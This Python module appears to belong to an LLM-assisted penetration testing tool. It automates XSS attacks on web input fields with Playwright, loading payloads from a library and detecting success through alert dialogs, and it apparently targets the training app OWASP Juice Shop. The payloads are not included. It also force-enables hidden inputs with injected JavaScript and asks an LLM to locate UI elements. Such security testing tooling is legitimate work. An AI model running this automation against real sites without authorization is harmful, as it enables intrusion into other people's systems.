import time
from typing import Dict, Optional, List
from script.scanner.page_asset import SiteAsset, InputField
from script.attacker.payload.a03_xss_payload import XSSPayloadLib
from script.analysis.owasp_llm_analyzer import PotentialIssue
from attacker.attack_target import AttackResult
import os


class XSSAttacker:
    def __init__(self, llm_proxy):
        self.llm_proxy = llm_proxy
        self.context = None

    def exploit(self, issue: PotentialIssue, site_asset: SiteAsset, session_context: Dict) -> AttackResult:
        """
        核心 XSS 攻击逻辑：基于纯浏览器交互 (DOM Interaction)。
        不尝试构造 URL，而是模拟用户输入并提交，依赖前端路由触发漏洞。
        """
        # 1. 获取 Playwright Page Context
        if 'playwright_page' in session_context:
            self.context = session_context['playwright_page'].context
        else:
            return AttackResult(
                success=False, vulnerability_type='XSS', severity="Error",
                proof_of_concept='', details="Missing playwright_page in session_context"
            )

        print(f"[*] Analyzing Issue: {issue.owasp_category} at {issue.location}")

        # 2. 目标还原：从 ID 找回 InputField 对象
        target_input: Optional[InputField] = None
        if issue.related_input_id is not None:
            for page in site_asset.pages.values():
                for inp in page.inputs:
                    if inp.internal_id == issue.related_input_id:
                        target_input = inp
                        break
                if target_input: break

        # 如果找不到输入框，对于 Interaction 策略来说就没法打了（或者需要兜底逻辑，这里先简化）
        if not target_input:
            return AttackResult(
                success=False, vulnerability_type='XSS', severity="Info",
                proof_of_concept='', details=f"Target InputField (ID: {issue.related_input_id}) not found."
            )

        print(f"[*] Target resolved: {target_input.tag} name='{target_input.name}' on {target_input.page_url}")

        # 3. 准备 Payloads
        # 推断上下文 (HTML vs Attribute) 以选择更精准的 Payload
        context_type = self._infer_context_type(target_input, issue)
        payloads = XSSPayloadLib.get_payloads(context=context_type)
        print(f"[*] Loaded {len(payloads)} payloads for context: {context_type}")

        # 4. 执行攻击循环
        page = self.context.new_page()
        try:
            # 进入核心交互逻辑
            result = self._execute_interaction_attack(page, target_input, payloads)
            if result:
                return result

        except Exception as e:
            print(f"[!] Attack Session Error: {e}")
        finally:
            page.close()

        return AttackResult(
            success=False, vulnerability_type='XSS', severity="Low",
            proof_of_concept='', request_snapshot={}, response_snapshot="",
            details="All interaction attempts failed."
        )

    def _execute_interaction_attack(self, page, target_input: InputField, payloads: List[str]) -> Optional[AttackResult]:
        """
        核心方法：填入 -> 激活 -> 提交 -> 监听
        """
        # [Step 0] 环境重置
        # 这步内部应该已经包含了 page.goto(url) 或 page.reload()
        # 执行完这步，页面是"新"的，Welcome Banner 应该是存在的
        self._reset_page_state(page, target_input.page_url)

        # [Step 1] 清理弹窗
        # 必须在 Reset 之后做，否则页面刷新后弹窗又回来了
        # 这会关掉遮挡层，确保后续的 Level 2/3 点击能生效
        self._dismiss_annoyances(page)

        # [Step 2] 激活输入框
        # 页面加载并清理后，立即激活一次
        self._ensure_input_active(page, target_input)

        for payload in payloads:
            xss_triggered = False
            success_payload = ""

            def handle_dialog(dialog):
                nonlocal xss_triggered, success_payload
                msg = str(dialog.message)

                # 检查是否是成功的 XSS 弹窗
                if dialog.type == "alert" and ("1" in msg or "xss" in msg.lower()):
                    # --- [新增] 高亮打印 Payload 供人工复现 ---
                    print(f"\n{'=' * 50}")
                    print(f"[★] 捕获到成功 Payload (Copy & Paste to Reproduce):")
                    print(f"Payload: {payload}")
                    print(f"{'=' * 50}\n")
                    # ----------------------------------------

                    print(f"[+] XSS Alert Triggered! Content: {msg}")
                    xss_triggered = True
                    success_payload = payload

                    dialog.accept()

                    # [新增] 只有关掉弹窗，Juice Shop 的 "Challenge Solved" 通知才会显示出来
                    # 等待一下那个绿色的横幅
                    try:
                        page.wait_for_timeout(1000)
                        page.screenshot(path="xss_success_proof.png")
                        self._save_evidence(page, f"xss_success_{int(time.time())}.png")
                        print("[*] Screenshot saved: xss_success_proof.png (Look for the green banner!)")
                    except:
                        pass
                else:
                    dialog.dismiss()

            page.on("dialog", handle_dialog)

            try:
                # A. 再次确保可见 (防止页面刷新重置了)
                self._ensure_input_active(page, target_input)

                # B. 填入 Payload (全面使用 force=True)
                # force=True 会绕过 Playwright 的 visibility/viewport 检查
                # print(f"[*] Filling payload: {payload[:20]}...")

                # 直接 Fill，跳过 click，因为 fill 内部也会尝试 focus
                page.fill(target_input.css_selector, payload, force=True)

                # C. 触发提交
                page.press(target_input.css_selector, "Enter")

                # D. 等待
                page.wait_for_timeout(2000)

                if xss_triggered:
                    return AttackResult(
                        success=True, vulnerability_type='XSS', severity="High",
                        proof_of_concept=success_payload, request_snapshot={}, response_snapshot="Alert Triggered",
                        details=f"DOM interaction successfully triggered XSS via router jump."
                    )

            except Exception as e:
                # print(f"[-] Payload execution error: {e}")
                pass
            finally:
                page.remove_listener("dialog", handle_dialog)

        return None

    def _ensure_input_active(self, page, target_input: InputField):
        """
        [三层激活策略] 确保目标输入框可见可用。
        Level 1: 静态规则 (快)
        Level 2: LLM 语义识别 (准)
        Level 3: JS 暴力破解 (稳)
        """
        selector = target_input.css_selector

        # 0. 快速检查：如果本来就是好的，直接返回
        if page.is_visible(selector) and page.is_enabled(selector):
            return

        print(f"[*] Input {selector} is hidden/disabled. Starting activation sequence...")

        # ---------------------------------------------------------
        # Level 1: 静态规则 (Static Heuristics) - < 10ms
        # ---------------------------------------------------------
        # 使用通用的 ARIA 和 Class 规则，而不是硬编码
        # static_toggles = [
        #     "button[aria-label*='search' i]",
        #     "a[aria-label*='search' i]",
        #     "[role='button'][aria-label*='search' i]",
        #     "mat-icon:text('search')",  # Angular Material 特例，因为太常见了
        #     ".search-icon",
        #     "i[class*='search']",
        #     "svg[class*='search']"
        # ]
        #
        # for toggle in static_toggles:
        #     try:
        #         if page.is_visible(toggle):
        #             # print(f"[*] Level 1: Clicking static toggle {toggle}")
        #             page.click(toggle, timeout=500, force=True)
        #             page.wait_for_timeout(500)
        #             if page.is_visible(selector):
        #                 print("[+] Activated via Level 1 (Static).")
        #                 return
        #     except:
        #         pass

        # ---------------------------------------------------------
        # Level 2: LLM 语义发现 (LLM Discovery) - ~2-5s
        # ---------------------------------------------------------
        # 如果静态规则没找到，请求 LLM 支援
        llm_selector = self._find_toggle_via_llm(page)
        if llm_selector:
            try:
                print(f"[*] Level 2: Clicking LLM-identified toggle {llm_selector}")
                # [关键修改] 加上 force=True，无视遮挡
                page.click(llm_selector, timeout=2000, force=True)

                page.wait_for_timeout(1000)
                if page.is_visible(selector):
                    print("[+] Activated via Level 2 (LLM).")
                    return
            except Exception as e:
                print(f"[-] Level 2 click failed: {e}")

        # ---------------------------------------------------------
        # Level 3: 暴力破解 (JS Force) - < 10ms
        # ---------------------------------------------------------
        # 如果以上都失败（或者 LLM 也没找对），使用核弹手段
        print(f"[*] Levels 1 & 2 failed. Engaging Level 3 (JS Force) on {selector}.")
        try:
            page.evaluate(f"""
                const el = document.querySelector('{selector}');
                if (el) {{
                    el.removeAttribute('disabled');
                    el.removeAttribute('readonly');
                    el.removeAttribute('hidden');
                    el.removeAttribute('aria-hidden');

                    el.style.display = 'block';
                    el.style.visibility = 'visible';
                    el.style.opacity = '1';
                    el.style.pointerEvents = 'auto';

                    // 强制固定在屏幕显眼位置，解决 outside viewport
                    el.style.position = 'fixed';
                    el.style.top = '10%;';
                    el.style.left = '10%';
                    el.style.width = '300px';
                    el.style.height = '50px';
                    el.style.zIndex = '2147483647';
                    el.style.backgroundColor = 'white';
                    el.style.border = '5px solid red'; // 显眼一点
                }}
            """)
            page.wait_for_timeout(200)
            print("[+] Input forcefully enabled via JS (Level 3).")
        except Exception as e:
            print(f"[!] Level 3 failed: {e}")

    def _infer_context_type(self, target_input: InputField, issue: PotentialIssue) -> str:
        """简单的上下文推断逻辑"""
        # 1. 物理特征优先
        if target_input.tag == "input" and target_input.input_type not in ["checkbox", "radio"]:
            return "attribute"  # <input value="...">
        if target_input.tag == "textarea":
            return "html"  # <textarea>...</textarea>

        # 2. LLM 建议辅助
        analysis_text = (str(issue.risk_reason) + str(issue.suggested_tests)).lower()
        if "attribute" in analysis_text or "value" in analysis_text:
            return "attribute"

        # 3. Payload 特征辅助
        for hint in issue.suggested_tests:
            if '"> ' in hint or "'>" in hint:
                return "attribute"

        return "html"  # 默认

    def _find_toggle_via_llm(self, page) -> Optional[str]:
        """
        [Level 2] 智能感知：修复了 SVG 兼容性问题的版本
        """
        print("[*] Level 1 failed. Engaging LLM (Level 2) to visually identify search toggle...")

        candidates = page.evaluate("""() => {
            const allElements = document.querySelectorAll('*');
            const candidates = [];
            let idCounter = 0;

            allElements.forEach(el => {
                // 1. 过滤不可见元素
                const style = window.getComputedStyle(el);
                if (style.display === 'none' || style.visibility === 'hidden' || parseFloat(style.opacity) === 0 || el.offsetParent === null) {
                    return;
                }

                // [修复点 1] 安全获取文本内容 (兼容 SVG)
                // SVG 元素没有 innerText，只能用 textContent
                const textContent = el.innerText || el.textContent || "";
                const rawText = textContent.slice(0, 50).replace(/\\n/g, ' ').trim();

                // [修复点 2] 安全获取 Class (兼容 SVG)
                // SVG 的 className 是个对象 (SVGAnimatedString)，不能直接当字符串用
                let className = "";
                if (typeof el.className === 'string') {
                    className = el.className;
                } else if (el.getAttribute) {
                    className = el.getAttribute('class') || "";
                }

                // 2. 核心特征提取
                const tagName = el.tagName;
                const role = el.getAttribute('role');
                const cursor = style.cursor;
                const ariaLabel = el.getAttribute('aria-label') || "";

                // 关键词嗅探
                const rawAttr = (el.id + className + ariaLabel).toLowerCase();

                // 3. 筛选逻辑
                const isInteractive = ['BUTTON', 'A', 'INPUT', 'IMG', 'SVG'].includes(tagName) || role === 'button' || cursor === 'pointer';
                const hasKeyword = rawAttr.includes('search') || rawAttr.includes('find') || rawAttr.includes('query');

                if (isInteractive || hasKeyword) {
                    if (candidates.length >= 30) return;

                    candidates.push({
                        id: idCounter,
                        tag: tagName,
                        text: rawText,
                        aria_label: ariaLabel,
                        class: className,
                        cursor: cursor, 
                        is_icon: rawAttr.includes('icon') || tagName === 'I' || tagName === 'SVG' || tagName === 'PATH'
                    });

                    el.setAttribute('data-pt-llm-id', idCounter);
                    idCounter++;
                }
            });
            return candidates;
        }""")

        if not candidates:
            print("[-] No interactive candidates found by JS.")
            return None

        # B. 构造 Prompt (保持不变)
        import json
        candidates_json = json.dumps(candidates, indent=2)

        prompt = f"""
        I am an automated testing agent. I need to find the specific UI element that **opens/toggles the search bar**.
        It is usually a magnifying glass icon, a button labeled "Search", or an icon button.

        Here is the JSON list of interactive elements found on the current page:
        {candidates_json}

        Task: Analyze the 'text', 'class', 'aria_label' and 'is_icon' fields.
        Identify the element that is most likely the "Search Toggle".

        Output Requirement:
        Return ONLY the integer 'id' of the best candidate.
        If you are not sure or none match, return -1.
        Do not output any explanation.
        """

        try:
            # 请确保这里的调用方法与你的 LLM 客户端一致
            response = self.llm_proxy.complete(prompt)

            import re
            match = re.search(r'-?\d+', str(response))
            if match:
                target_id = int(match.group())
                if target_id != -1:
                    print(f"[+] LLM identified candidate ID {target_id} as search toggle.")
                    return f"[data-pt-llm-id='{target_id}']"
        except Exception as e:
            print(f"[!] LLM analysis failed: {e}")

        return None

    def _dismiss_annoyances(self, page):
        """
        [通用] 关闭常见的遮挡弹窗 (Welcome Banner, Cookie Consent)
        """
        print("[*] Attempting to dismiss overlays/popups...")
        try:
            # 1. Juice Shop "Dismiss" button
            # 2. Cookie consent "Me want it" or "Accept"
            # 3. Generic "Close" buttons
            dismiss_selectors = [
                "button[aria-label='Close Welcome Banner']",
                ".close-dialog",
                "button:has-text('Dismiss')",
                "a[aria-label='dismiss cookie message']",
                "button:has-text('Me want it')",  # Juice Shop 特有
                "button:has-text('Accept')"
            ]

            for sel in dismiss_selectors:
                if page.is_visible(sel):
                    page.click(sel, force=True)
                    page.wait_for_timeout(200)  # 等动画消失

            # 强制移除 backdrop (如果点不掉的话，直接删 DOM)
            page.evaluate("""
                const backdrops = document.querySelectorAll('.cdk-overlay-backdrop, .modal-backdrop');
                backdrops.forEach(b => b.remove());
            """)
        except:
            pass

    def _reset_page_state(self, page, url: str):
        """
        [环境重置 - 核弹版]
        强制销毁当前 DOM，确保彻底清除之前的 JS Force 修改。
        """
        print(f"[*] Resetting page state for {url}...")

        try:
            # 1. 先跳到空白页 (彻底销毁当前页面上下文)
            # 这一步是关键！它保证了之前的 DOM 修改完全灰飞烟灭
            page.goto("about:blank")

            # 2. 清除上下文级别的存储 (Cookie/Storage)
            context = page.context
            context.clear_cookies()

            # 3. 重新导航到目标页面
            # 这一次加载出的页面，绝对是服务器返回的原始状态 (Search Bar 隐藏)
            page.goto(url, timeout=15000, wait_until="domcontentloaded")

            # 4. 再次确保清理 Storage (针对 Juice Shop 的 Welcome Banner 状态)
            page.evaluate("sessionStorage.clear(); localStorage.clear();")
            # 刷新以生效 Storage 的清除 (让 Banner 重新弹出来)
            page.reload(wait_until="domcontentloaded")

        except Exception as e:
            print(f"[!] Page reset failed: {e}")
            # 如果重置都失败了，后续测试可能不准，建议抛出异常或重试
            raise e

        print("[+] Page reset complete. DOM is fresh.")

    def _save_evidence(self, page, filename="xss_success.png"):
        # 1. 获取项目根目录 (或者当前脚本的目录)
        # 这里的逻辑是：获取当前脚本所在目录，然后往上找，或者直接在当前目录下建文件夹
        base_dir = os.getcwd()
        screenshot_dir = os.path.join(base_dir, "screenshots")

        # 2. 如果文件夹不存在，自动创建
        if not os.path.exists(screenshot_dir):
            os.makedirs(screenshot_dir)

        # 3. 拼接完整路径
        full_path = os.path.join(screenshot_dir, filename)

        # 4. 截图
        try:
            page.screenshot(path=full_path)
            print(f"[*] Screenshot saved to: {full_path}")
        except Exception as e:
            print(f"[!] Failed to save screenshot: {e}")